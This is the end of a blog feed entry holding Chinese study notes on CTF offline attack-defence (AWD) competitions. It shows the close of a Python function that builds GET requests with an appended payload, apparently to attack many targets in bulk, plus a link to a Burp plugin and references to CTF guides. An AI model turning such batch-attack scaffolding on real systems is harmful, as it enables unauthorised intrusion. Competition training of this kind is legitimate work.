payload)</span><br><span class="line">                              request = requests.Request(&quot;GET&quot;, new_url)</span><br><span class="line">                              all_requests.append(request)</span><br><span class="line">    return all_requests</span><br></pre></td></tr></table></figure><h4 id="流量复用"><a href="#流量复用" class="headerlink" title="流量复用"></a>流量复用</h4><p><a href="http://www.kericwy.xyz/files/scriptgen-burp-plugin-6.jar" target="_blank" rel="noopener">http://www.kericwy.xyz/files/scriptgen-burp-plugin-6.jar</a> </p><h2 id="参考网站："><a href="#参考网站：" class="headerlink" title="参考网站："></a>参考网站：</h2><p><a href="http://blog.nsfocus.net/ctf-off-line-attack-defense-guidelines/" target="_blank" rel="noopener">http://blog.nsfocus.net/ctf-off-line-attack-defense-guidelines/</a></p><p><a href="https://rcoil.me/2017/06/CTF%E7%BA%BF%E4%B8%8B%E8%B5%9B%E6%80%BB%E7%BB%93/" target="_blank" rel="noopener">https://rcoil.me/2017/06/CTF%E7%BA%BF%E4%B8%8B%E8%B5%9B%E6%80%BB%E7%BB%93/</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;ctf线下AWD攻防赛学习笔记&quot;&gt;&lt;a href=&quot;#ctf线下AWD攻防赛学习笔记&quot; class=&quot;headerlink&quot; title=&quot;ctf线下AWD攻防赛学习笔记&quot;&gt;&lt;/a&gt;ctf线下AWD攻防赛学习笔记&lt;/h1&gt;&lt;p&gt;CTF线下攻防赛主要以攻防模式（At
      
    
    </summary>
    
      <category term="CTF" scheme="https://plutoacharon.github.io/categories/CTF/"/>
    
    
      <category term="AWD" scheme="https://plutoacharon.github.io/tags/AWD/"/>
    
  </entry>
  
</feed>
